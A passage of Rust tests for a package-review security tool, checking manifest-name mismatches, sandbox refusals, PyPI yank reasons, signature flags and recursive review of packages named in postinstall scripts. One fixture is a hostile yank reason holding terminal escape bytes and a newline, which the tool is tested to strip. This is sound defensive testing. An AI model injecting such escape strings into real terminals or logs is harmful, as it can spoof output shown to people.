    /// The same binding for cargo, where `[package] name` was never read. The
    /// root check passes because the directory is named for the resolved
    /// package; the manifest inside it still declares something else.
    #[test]
    fn prepare_extracted_root_refuses_cargo_name_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("demo-crate-1.0.0");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join("Cargo.toml"),
            "[package]\nname = \"other-crate\"\nversion = \"1.0.0\"\n",
        )
        .unwrap();
        let err = prepare_extracted_root(dir.path(), Ecosystem::Cargo, "demo-crate", "1.0.0")
            .unwrap_err()
            .to_string();
        assert!(
            err.contains(
                "archive manifest declares `other-crate` but the review resolved `demo-crate`; refusing to review"
            ),
            "unexpected error: {err}"
        );
    }

    /// A matching name is the happy path and must not regress into a refusal.
    #[test]
    fn prepare_extracted_root_accepts_a_matching_npm_name() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("package")).unwrap();
        std::fs::write(
            dir.path().join("package/package.json"),
            br#"{"name":"demo","version":"1.0.0"}"#,
        )
        .unwrap();
        let (_root, manifest) =
            prepare_extracted_root(dir.path(), Ecosystem::Npm, "demo", "1.0.0").unwrap();
        assert_eq!(manifest.name, "demo");
    }
}

#[cfg(test)]
mod recursive_tests {
    use super::*;
    use crate::registry::{Checksum, ChecksumAlg, Package, Release};
    use crate::store::BaselineStore;
    use std::collections::HashMap;

    struct FakeRegistry {
        packages: HashMap<String, String>,
        fetches: std::sync::Arc<std::sync::atomic::AtomicU32>,
        /// The signature block this registry publishes per release, if any.
        signatures: Option<serde_json::Value>,
    }

    impl FakeRegistry {
        fn new(packages: &[(&str, &str)]) -> Self {
            Self::with_counter(
                packages,
                std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0)),
            )
        }

        fn with_signatures(packages: &[(&str, &str)], signatures: serde_json::Value) -> Self {
            let mut reg = Self::new(packages);
            reg.signatures = Some(signatures);
            reg
        }

        fn with_counter(
            packages: &[(&str, &str)],
            fetches: std::sync::Arc<std::sync::atomic::AtomicU32>,
        ) -> Self {
            Self {
                packages: packages
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect(),
                fetches,
                signatures: None,
            }
        }

        fn tarball_bytes(&self, name: &str, version: &str) -> Option<Vec<u8>> {
            let json = self.packages.get(&format!("{name}@{version}"))?;
            Some(build_npm_tarball(json))
        }
    }

    impl Registry for FakeRegistry {
        fn ecosystem(&self) -> Ecosystem {
            Ecosystem::Npm
        }
        fn resolve(
            &self,
            name: &str,
            version: &str,
        ) -> Result<Package, crate::error::BluelineError> {
            let bytes = self
                .tarball_bytes(name, version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(name.to_string()))?;
            Ok(Package {
                name: name.to_string(),
                version: version.to_string(),
                tarball_url: "https://fixture.invalid/x.tgz".to_string(),
                integrity: Some(sha512_checksum(&bytes)),
            })
        }
        fn fetch_tarball(&self, pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
            use std::sync::atomic::Ordering;
            self.fetches.fetch_add(1, Ordering::SeqCst);
            self.tarball_bytes(&pkg.name, &pkg.version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(pkg.name.clone()))
        }
        fn list_versions(
            &self,
            name: &str,
        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
            let mut versions: Vec<semver::Version> = self
                .packages
                .keys()
                .filter(|k| k.rsplit_once('@').map(|(n, _)| n == name).unwrap_or(false))
                .filter_map(|k| k.rsplit_once('@')?.1.parse().ok())
                .collect();
            versions.sort();
            Ok(versions)
        }
        fn list_releases(&self, name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
            Ok(self
                .list_versions(name)?
                .into_iter()
                .map(|v| Release {
                    version: v.to_string(),
                    yanked: false,
                    publish_time: None,
                })
                .collect())
        }
        fn default_version(
            &self,
            name: &str,
        ) -> Result<Option<String>, crate::error::BluelineError> {
            Ok(self
                .list_versions(name)?
                .iter()
                .map(|v| v.to_string())
                .next_back())
        }
        fn release_signatures(&self, _pkg: &Package) -> Option<serde_json::Value> {
            self.signatures.clone()
        }
    }

    struct FakePyPI {
        packages: Vec<String>,
    }

    impl FakePyPI {
        fn new(pinned_specs: &[&str]) -> Self {
            Self {
                packages: pinned_specs.iter().map(|s| s.to_string()).collect(),
            }
        }

        fn tarball_bytes(&self, name: &str, version: &str) -> Option<Vec<u8>> {
            if !self
                .packages
                .iter()
                .any(|s| s == &format!("{name}=={version}"))
            {
                return None;
            }
            let metadata = format!("Name: {name}\nVersion: {version}\n");
            Some(build_sdist_tarball(&metadata))
        }
    }

    impl Registry for FakePyPI {
        fn ecosystem(&self) -> Ecosystem {
            Ecosystem::PyPi
        }
        fn resolve(
            &self,
            name: &str,
            version: &str,
        ) -> Result<Package, crate::error::BluelineError> {
            let bytes = self
                .tarball_bytes(name, version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(name.to_string()))?;
            Ok(Package {
                name: name.to_string(),
                version: version.to_string(),
                tarball_url: format!("https://fixture.invalid/{name}-{version}.tar.gz"),
                integrity: Some(sha512_checksum(&bytes)),
            })
        }
        fn fetch_tarball(&self, pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
            self.tarball_bytes(&pkg.name, &pkg.version)
                .ok_or_else(|| crate::error::BluelineError::NotFound(pkg.name.clone()))
        }
        fn list_versions(
            &self,
            _name: &str,
        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
            Ok(Vec::new())
        }
        fn list_releases(&self, _name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
            Ok(Vec::new())
        }
        fn default_version(
            &self,
            _name: &str,
        ) -> Result<Option<String>, crate::error::BluelineError> {
            Ok(None)
        }
    }

    fn build_sdist_tarball(metadata: &str) -> Vec<u8> {
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        {
            let mut tar = tar::Builder::new(&mut enc);
            let mut header = tar::Header::new_gnu();
            header.set_path("pkg-1.0.0/METADATA").unwrap();
            header.set_size(metadata.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append(&header, metadata.as_bytes()).unwrap();
            tar.finish().unwrap();
        }
        enc.finish().unwrap()
    }

    fn build_npm_tarball(package_json: &str) -> Vec<u8> {
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        {
            let mut tar = tar::Builder::new(&mut enc);
            let mut header = tar::Header::new_gnu();
            let path = "package/package.json";
            header.set_path(path).unwrap();
            header.set_size(package_json.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append(&header, package_json.as_bytes()).unwrap();
            tar.finish().unwrap();
        }
        enc.finish().unwrap()
    }

    fn sha512_checksum(bytes: &[u8]) -> Checksum {
        use sha2::{Digest, Sha512};
        Checksum {
            alg: ChecksumAlg::Sha512,
            value_hex: hex_encode(&Sha512::digest(bytes)),
        }
    }

    fn hex_encode(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    fn fixture_bases() -> RegistryBases {
        RegistryBases {
            npm: "http://127.0.0.1:9".to_string(),
            cargo: "http://127.0.0.1:9".to_string(),
            pypi: "http://127.0.0.1:9".to_string(),
            aur: "http://127.0.0.1:9".to_string(),
        }
    }

    fn no_advisory_policy() -> Policy {
        let mut policy = Policy::default();
        policy.policy.check_advisories = false;
        policy
    }

    fn evaluate_test(
        packages: &[(&str, &str)],
        spec: &str,
        policy: &Policy,
    ) -> (crate::verdict::Verdict, u32) {
        let registry = FakeRegistry::new(packages);
        use std::sync::atomic::Ordering;
        let fetches = registry.fetches.clone();
        let verdict = evaluate_with_fake(registry, spec, policy);
        (verdict, fetches.load(Ordering::SeqCst))
    }

    fn evaluate_with_fake(
        registry: FakeRegistry,
        spec: &str,
        policy: &Policy,
    ) -> crate::verdict::Verdict {
        let (name, version) = spec.split_once('@').unwrap();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut ctx = ReviewContext::new(policy, fixture_bases());
        let registry = std::rc::Rc::new(registry);
        ctx.inject_registry(Ecosystem::Npm, registry.clone());
        let (verdict, _, _, _) =
            evaluate_package(name, version, Ecosystem::Npm, &store, policy, &mut ctx).unwrap();
        verdict
    }

    /// An AUR adapter that must never be asked for anything.
    ///
    /// Both failure strings are tokens, so a test that reaches them is a test
    /// that found the gate in the wrong place: the refusal has to happen before
    /// the first registry call, because a refusal reached after the fetch is a
    /// disclosure wearing an error's clothes.
    struct FakeAurGated;

    impl Registry for FakeAurGated {
        fn ecosystem(&self) -> Ecosystem {
            Ecosystem::Aur
        }
        fn resolve(
            &self,
            _name: &str,
            _version: &str,
        ) -> Result<Package, crate::error::BluelineError> {
            Err(crate::error::BluelineError::NotFound(
                "resolve-must-not-run".to_string(),
            ))
        }
        fn fetch_tarball(&self, _pkg: &Package) -> Result<Vec<u8>, crate::error::BluelineError> {
            Err(crate::error::BluelineError::NotFound(
                "fetch-must-not-run".to_string(),
            ))
        }
        fn list_versions(
            &self,
            _name: &str,
        ) -> Result<Vec<semver::Version>, crate::error::BluelineError> {
            Err(crate::error::BluelineError::NotFound(
                "list-versions-must-not-run".to_string(),
            ))
        }
        fn list_releases(&self, _name: &str) -> Result<Vec<Release>, crate::error::BluelineError> {
            Err(crate::error::BluelineError::NotFound(
                "list-releases-must-not-run".to_string(),
            ))
        }
        fn default_version(
            &self,
            _name: &str,
        ) -> Result<Option<String>, crate::error::BluelineError> {
            Err(crate::error::BluelineError::NotFound(
                "default-version-must-not-run".to_string(),
            ))
        }
    }

    /// `require_sandbox` on the AUR lane refuses instead of promising.
    ///
    /// The key means "refuse a review the kernel could not confine". The AUR
    /// bytes come from `git clone` plus `git archive`, which no Landlock domain
    /// can cover, so honouring the key there would mean reporting a confinement
    /// that never existed for the bytes that matter most. The refusal is what
    /// `src/sandbox.rs::extract` already does for its own fallback; this closes
    /// the second half of the same promise.
    #[test]
    fn require_sandbox_refuses_an_aur_review_before_any_registry_call() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut policy = no_advisory_policy();
        policy.policy.require_sandbox = true;
        let mut ctx = ReviewContext::new(&policy, fixture_bases());
        ctx.inject_registry(Ecosystem::Aur, std::rc::Rc::new(FakeAurGated));

        let err = evaluate_package("yay", "1.0.0", Ecosystem::Aur, &store, &policy, &mut ctx)
            .expect_err("require_sandbox must refuse an AUR review rather than promise it")
            .to_string();
        assert!(
            err.contains("git clone"),
            "the refusal must name the step that cannot be confined, got: {err}"
        );
        assert!(
            err.contains("require_sandbox"),
            "the refusal must name the key the operator set, got: {err}"
        );
        for token in [
            "resolve-must-not-run",
            "fetch-must-not-run",
            "list-versions-must-not-run",
            "list-releases-must-not-run",
            "default-version-must-not-run",
        ] {
            assert!(
                !err.contains(token),
                "the gate ran too late: the review already touched the registry ({token})"
            );
        }
    }

    /// The same lane reviews fine with the key off, which is the default. This
    /// is the pair that keeps the refusal above from reading as "AUR is
    /// unsupported": without the key the review reaches the registry and fails
    /// on the fixture's own absence, which is the ordinary path.
    #[test]
    fn an_aur_review_proceeds_when_the_key_is_unset() {
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let policy = no_advisory_policy();
        let mut ctx = ReviewContext::new(&policy, fixture_bases());
        ctx.inject_registry(Ecosystem::Aur, std::rc::Rc::new(FakeAurGated));

        let err = evaluate_package("yay", "1.0.0", Ecosystem::Aur, &store, &policy, &mut ctx)
            .expect_err("the fixture has no package, so the review fails on that")
            .to_string();
        assert!(
            err.contains("resolve-must-not-run"),
            "with the key off the review must reach the registry, got: {err}"
        );
    }

    /// Serves a PEP 691 Simple index for one package plus the artifact bytes
    /// it points at, and 404s everything else (which is what the provenance
    /// endpoint gets, so the report is a clean `Missing`).
    struct MockIndex {
        base: String,
        _handle: std::thread::JoinHandle<()>,
    }

    impl MockIndex {
        fn spawn<F>(name: &str, routes: F) -> Self
        where
            F: FnOnce(&str) -> (String, Vec<(String, Vec<u8>)>) + Send + 'static,
        {
            use std::io::{Read, Write};
            use std::net::TcpListener;
            use std::sync::Arc;

            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let base = format!("http://{}", listener.local_addr().unwrap());
            let index = Arc::new(routes(&base));
            let index_path = format!("/simple/{name}/");
            let handle = std::thread::spawn(move || {
                for stream in listener.incoming().flatten() {
                    let index = index.clone();
                    let index_path = index_path.clone();
                    std::thread::spawn(move || {
                        let mut stream = stream;
                        let mut buf = [0u8; 4096];
                        let n = stream.read(&mut buf).unwrap_or(0);
                        let path = String::from_utf8_lossy(&buf[..n])
                            .lines()
                            .next()
                            .and_then(|l| l.split_whitespace().nth(1))
                            .unwrap_or("/")
                            .to_string();
                        if path == index_path {
                            let body = index.0.clone();
                            let head = format!(
                                "HTTP/1.1 200 OK\r\nContent-Type: application/vnd.pypi.simple.v1+json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                                body.len()
                            );
                            let _ = stream.write_all(head.as_bytes());
                            let _ = stream.write_all(body.as_bytes());
                        } else if let Some((_, bytes)) = index
                            .1
                            .iter()
                            .find(|(p, _)| *p == path.trim_start_matches('/'))
                        {
                            let head = format!(
                                "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                                bytes.len()
                            );
                            let _ = stream.write_all(head.as_bytes());
                            let _ = stream.write_all(bytes);
                        } else {
                            let _ = stream.write_all(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
                        }
                    });
                }
            });
            Self {
                base,
                _handle: handle,
            }
        }
    }

    fn sha256_hex(bytes: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        format!("{:x}", Sha256::digest(bytes))
    }

    /// The withdrawal reason travels the whole way: PEP 592 `data-yanked` on
    /// the Simple index → the release list the review reads → the baseline
    /// selection → the finding a reviewer reads. Before this, the reason was
    /// dropped at `From<PyPiRelease> for Release` and the card said only
    /// "yanked".
    #[test]
    fn pypi_yanked_reasons_reach_the_card() {
        let sdist =
            |version: &str| build_sdist_tarball(&format!("Name: demo\nVersion: {version}\n"));
        let prior = sdist("1.1.0");
        let target = sdist("1.2.0");

        let server = MockIndex::spawn("demo", move |base| {
            let entry = |version: &str, bytes: &[u8], yanked: serde_json::Value| {
                let filename = format!("demo-{version}.tar.gz");
                serde_json::json!({
                    "filename": filename,
                    "url": format!("{base}/packages/{filename}"),
                    "hashes": {"sha256": sha256_hex(bytes)},
                    "yanked": yanked,
                })
            };
            let index = serde_json::json!({
                "name": "demo",
                "versions": ["1.0.0", "1.1.0", "1.2.0"],
                "files": [
                    entry("1.0.0", &sdist("1.0.0"), serde_json::json!(false)),
                    entry("1.1.0", &prior, serde_json::json!("critical vulnerability, no upgrade path")),
                    // A hostile reason: escape bytes and a newline in registry text.
                    entry("1.2.0", &target, serde_json::json!("\u{1b}[31mdemo is compromised\u{1b}[0m\nsecond line")),
                ]
            });
            (
                index.to_string(),
                vec![
                    ("packages/demo-1.0.0.tar.gz".to_string(), sdist("1.0.0")),
                    ("packages/demo-1.2.0.tar.gz".to_string(), target),
                ],
            )
        });

        let policy = no_advisory_policy();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut bases = fixture_bases();
        bases.pypi = server.base.clone();
        let mut ctx = ReviewContext::new(&policy, bases);
        let (verdict, _, _, _) =
            evaluate_package("demo", "1.2.0", Ecosystem::PyPi, &store, &policy, &mut ctx).unwrap();

        let finding = |rule_id: &str| {
            verdict
                .findings
                .iter()
                .find(|f| f.rule_id == rule_id)
                .unwrap_or_else(|| {
                    panic!(
                        "expected {rule_id}, got {:?}",
                        verdict
                            .findings
                            .iter()
                            .map(|f| &f.rule_id)
                            .collect::<Vec<_>>()
                    )
                })
                .description
                .clone()
        };

        let r08 = finding("R08_YANKED_PREDECESSOR");
        assert!(
            r08.contains("registry-stated reason: `critical vulnerability, no upgrade path`"),
            "the registry's reason for the withdrawn predecessor must reach the card: {r08}"
        );
        let r09 = finding("R09_YANKED_TARGET");
        assert!(
            !r09.contains('\x1b'),
            "escape bytes reached the card: {r09:?}"
        );
        assert!(!r09.contains('\n'), "a newline reached the card: {r09:?}");
        assert!(
            r09.contains("registry-stated reason: `demo is compromised second line`"),
            "the registry's reason for the withdrawn target must reach the card: {r09}"
        );
    }

    /// A package whose withdrawn release carries no reason says so on the
    /// card rather than reading as if a cause had been given.
    #[test]
    fn a_pypi_yank_without_a_reason_says_no_reason_published() {
        let sdist =
            |version: &str| build_sdist_tarball(&format!("Name: demo\nVersion: {version}\n"));
        let target = sdist("1.1.0");
        let server = MockIndex::spawn("demo", move |base| {
            let entry = |version: &str, bytes: &[u8], yanked: serde_json::Value| {
                let filename = format!("demo-{version}.tar.gz");
                serde_json::json!({
                    "filename": filename,
                    "url": format!("{base}/packages/{filename}"),
                    "hashes": {"sha256": sha256_hex(bytes)},
                    "yanked": yanked,
                })
            };
            let index = serde_json::json!({
                "name": "demo",
                "versions": ["1.0.0", "1.1.0"],
                "files": [
                    entry("1.0.0", &sdist("1.0.0"), serde_json::json!(false)),
                    // PEP 592's boolean form: withdrawn, with no cause stated.
                    entry("1.1.0", &target, serde_json::json!(true)),
                ]
            });
            (
                index.to_string(),
                vec![
                    ("packages/demo-1.0.0.tar.gz".to_string(), sdist("1.0.0")),
                    ("packages/demo-1.1.0.tar.gz".to_string(), target),
                ],
            )
        });

        let policy = no_advisory_policy();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut bases = fixture_bases();
        bases.pypi = server.base.clone();
        let mut ctx = ReviewContext::new(&policy, bases);
        let (verdict, _, _, _) =
            evaluate_package("demo", "1.1.0", Ecosystem::PyPi, &store, &policy, &mut ctx).unwrap();
        let r09 = verdict
            .findings
            .iter()
            .find(|f| f.rule_id == "R09_YANKED_TARGET")
            .expect("the target is withdrawn")
            .description
            .clone();
        assert!(r09.contains("(no reason published)"), "{r09}");
        assert!(!r09.contains("registry-stated reason"), "{r09}");
    }

    fn signature_policy() -> Policy {
        let mut policy = no_advisory_policy();
        policy.provenance.require_signatures = true;
        policy
    }

    /// The engine still refuses an unsigned release when the flag is set. It is
    /// no longer reachable from a policy file -- `require_signatures` is refused
    /// at load, because a published block is presence and not verification -- so
    /// this constructs the policy directly. The rule is kept as the fail-closed
    /// direction for any caller that sets the field by another route: an unsigned
    /// release is refused rather than passing because the key looked satisfied.
    /// This is the behaviour `require_signatures` is refused at load for, pinned
    /// so the refusal cannot be undone by accident. With the flag set, a release
    /// whose packument carries *any* non-empty `dist.signatures` array passes:
    /// the bytes are never checked against the block, so a forged one satisfies
    /// the rule exactly as a genuine one does. The flag is set here directly
    /// because a policy file that sets it no longer loads.
    #[test]
    fn a_published_signature_block_satisfies_the_flag_without_being_verified() {
        let policy = signature_policy();
        let verdict = evaluate_with_fake(
            FakeRegistry::with_signatures(
                &[("signed@1.0.0", r#"{"name":"signed","version":"1.0.0"}"#)],
                serde_json::json!([{ "keyid": "SHA256:abc", "sig": "c2ln" }]),
            ),
            "signed@1.0.0",
            &policy,
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_SIGNATURE_REQUIRED_MISSING"),
            "this test exists to show a published block satisfies the key, which is why the \
             key is refused at load: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.rule_id, f.severity))
                .collect::<Vec<_>>()
        );
        assert_ne!(verdict.band, crate::verdict::VerdictBand::Block);
        let prov = verdict
            .trust_sources
            .as_ref()
            .and_then(|t| t.provenance.as_ref())
            .expect("the npm lane reports provenance");
        assert!(
            prov.registry_signature_present,
            "the report must still say a block was published, and the card must still say it \
             was not verified"
        );
    }

    /// The absent case is the fail-closed one and is unchanged: no published block,
    /// no satisfaction. This is the direction the engine still enforces for any
    /// caller that sets the flag, since refusing the key at load is about the
    /// *present* case being unverifiable, not about dropping the check.
    #[test]
    fn an_unsigned_release_is_refused_when_the_signature_flag_is_set() {
        let policy = signature_policy();
        let verdict = evaluate_with_fake(
            FakeRegistry::new(&[("unsigned@1.0.0", r#"{"name":"unsigned","version":"1.0.0"}"#)]),
            "unsigned@1.0.0",
            &policy,
        );
        let finding = verdict
            .findings
            .iter()
            .find(|f| f.rule_id == "P03_SIGNATURE_REQUIRED_MISSING")
            .expect("a policy that requires signatures must refuse the unsigned");
        assert_eq!(finding.severity, crate::verdict::VerdictBand::Block);
        assert_eq!(verdict.band, crate::verdict::VerdictBand::Block);
    }

    /// With the flag unset, a published block is disclosed rather than gating
    /// anything: the card says a signature exists, and still says it was not
    /// verified. This is the only shape a real review can now produce, since the
    /// flag is refused at load.
    #[test]
    fn a_published_signature_without_the_policy_flag_is_not_a_gate() {
        let policy = no_advisory_policy();
        let verdict = evaluate_with_fake(
            FakeRegistry::with_signatures(
                &[("signed@1.0.0", r#"{"name":"signed","version":"1.0.0"}"#)],
                serde_json::json!([{ "keyid": "SHA256:abc", "sig": "c2ln" }]),
            ),
            "signed@1.0.0",
            &policy,
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_SIGNATURE_REQUIRED_MISSING"),
            "{:?}",
            verdict.findings
        );
        let prov = verdict
            .trust_sources
            .as_ref()
            .and_then(|t| t.provenance.as_ref())
            .expect("the npm lane reports provenance");
        assert!(prov.registry_signature_present);
        assert_eq!(
            prov.registry_signature_key_id.as_deref(),
            Some("SHA256:abc")
        );
    }

    #[test]
    fn lifecycle_reference_triggers_recursive_review() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::High),
            "expected R24 High, got {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
        assert_eq!(verdict.recursive.len(), 1);
        let child = &verdict.recursive[0];
        assert_eq!(child.name, "b");
        assert_eq!(child.version, "1.0.0");
        assert_eq!(child.chain, vec!["a@1.0.0", "npm:b@1.0.0"]);
        // A Medium child stays below the default HIGH roll-up threshold.
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R27_SECOND_ORDER"),
            "Medium child must not roll up at the HIGH threshold"
        );
    }

    #[test]
    fn child_block_band_policy_lowering_rolls_up_medium_children() {
        let mut policy = no_advisory_policy();
        policy.recursion.child_block_band = crate::verdict::VerdictBand::Medium;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        let r27 = verdict
            .findings
            .iter()
            .find(|f| f.rule_id == "R27_SECOND_ORDER")
            .expect("MEDIUM threshold rolls up the Medium child");
        assert_eq!(r27.severity, crate::verdict::VerdictBand::Medium);
    }

    #[test]
    fn repeated_reference_reuses_cached_review_after_budget_spent() {
        let mut policy = no_advisory_policy();
        policy.recursion.max_child_reviews = 1;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0","prepare":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(
            verdict.recursive.len(),
            2,
            "a cached reuse must survive budget exhaustion"
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH"),
            "reusing a completed review is not a cap violation"
        );
    }

    #[test]
    fn unpinned_reference_does_not_reuse_a_stale_pinned_review() {
        // `foo@1.0.0` is reviewed first; the bare `foo` floats and must
        // resolve the current latest (`2.0.0`) for its own review rather
        // than reusing the completed `1.0.0` review. Reusing it would vouch
        // for bytes the install never fetches.
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install foo@1.0.0 && npm install foo"}}"#,
                ),
                ("foo@1.0.0", r#"{"name":"foo","version":"1.0.0"}"#),
                ("foo@2.0.0", r#"{"name":"foo","version":"2.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(
            verdict.recursive.len(),
            2,
            "pinned and floating references must each be reviewed: {}",
            serde_json::to_string(&verdict.recursive).unwrap_or_default()
        );
        let mut versions: Vec<&str> = verdict
            .recursive
            .iter()
            .map(|c| c.version.as_str())
            .collect();
        versions.sort_unstable();
        assert_eq!(versions, ["1.0.0", "2.0.0"]);
    }

    #[test]
    fn unpinned_reference_reuses_the_exact_completed_review() {
        // When the floating reference resolves to the already-reviewed
        // release, the exact completed review is reused: one fresh review,
        // two roll-ups, no cap violation.
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install foo@1.0.0 && npm install foo"}}"#,
                ),
                ("foo@1.0.0", r#"{"name":"foo","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 2);
        assert!(
            verdict.recursive.iter().all(|c| c.version == "1.0.0"),
            "both references resolve the same release: {:?}",
            verdict
                .recursive
                .iter()
                .map(|c| &c.version)
                .collect::<Vec<_>>()
        );
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH"),
            "reusing the exact completed review is not a cap violation"
        );
    }

    #[test]
    fn recursive_pass_runs_on_modified_lifecycle_script_with_baseline() {
        let policy = no_advisory_policy();
        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let old_json = r#"{"name":"a","version":"0.9.0"}"#;
        let old_tar = build_npm_tarball(old_json);
        store
            .record_verified(Ecosystem::Npm, "a", "0.9.0", &sha512_checksum(&old_tar))
            .unwrap();
        store
            .mark_clean(Ecosystem::Npm, "a", "0.9.0", &sha512_checksum(&old_tar))
            .unwrap();
        let mut ctx = ReviewContext::new(&policy, fixture_bases());
        ctx.inject_registry(
            Ecosystem::Npm,
            std::rc::Rc::new(FakeRegistry::new(&[
                ("a@0.9.0", old_json),
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ])),
        );
        let (verdict, _, _, _) =
            evaluate_package("a", "1.0.0", Ecosystem::Npm, &store, &policy, &mut ctx).unwrap();
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"),
            "R24 must fire on a baseline review too: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
        assert_eq!(verdict.recursive.len(), 1);
    }

    #[test]
    fn install_references_at_the_exact_cap_are_not_disclosed_as_overflow() {
        let policy = no_advisory_policy();
        let specs: Vec<(String, String)> = (1..=MAX_INSTALL_REFS as i64)
            .map(|i| {
                let json = format!(r#"{{"name":"p{i}","version":"1.0.0"}}"#);
                (format!("p{i}@1.0.0"), json)
            })
            .collect();
        let many = specs
            .iter()
            .map(|(k, _)| k.as_str())
            .collect::<Vec<_>>()
            .join(" ");
        let script =
            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install SPECS"}}"#
                .replace("SPECS", &many);
        let mut packages: Vec<(&str, &str)> = vec![("a@1.0.0", script.as_str())];
        packages.extend(specs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
        let (verdict, _) = evaluate_test(&packages, "a@1.0.0", &policy);
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| f.title == "Install-reference cap exceeded"),
            "exactly {MAX_INSTALL_REFS} references fit the cap; disclosure would be a false positive"
        );
    }

    #[test]
    fn install_reference_overflow_is_truncated_and_disclosed() {
        let policy = no_advisory_policy();
        let specs: Vec<(String, String)> = (1..=33)
            .map(|i| {
                let json = format!(r#"{{"name":"p{i}","version":"1.0.0"}}"#);
                (format!("p{i}@1.0.0"), json)
            })
            .collect();
        let many = specs
            .iter()
            .map(|(k, _)| k.as_str())
            .collect::<Vec<_>>()
            .join(" ");
        let script =
            r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install SPECS"}}"#
                .replace("SPECS", &many);
        let mut packages: Vec<(&str, &str)> = vec![("a@1.0.0", script.as_str())];
        packages.extend(specs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
        let (verdict, _) = evaluate_test(&packages, "a@1.0.0", &policy);
        assert_eq!(verdict.recursive.len(), 8, "budget bounds children");
        let cap = verdict
            .findings
            .iter()
            .find(|f| f.title == "Install-reference cap exceeded")
            .expect("overflow must be disclosed");
        assert_eq!(cap.severity, crate::verdict::VerdictBand::High);
        assert!(cap.description.contains("33"), "{cap:?}");
    }

    #[test]
    fn review_children_maps_pkgbuild_refs_to_npm_and_pip_refs_to_pypi() {
        let policy = no_advisory_policy();
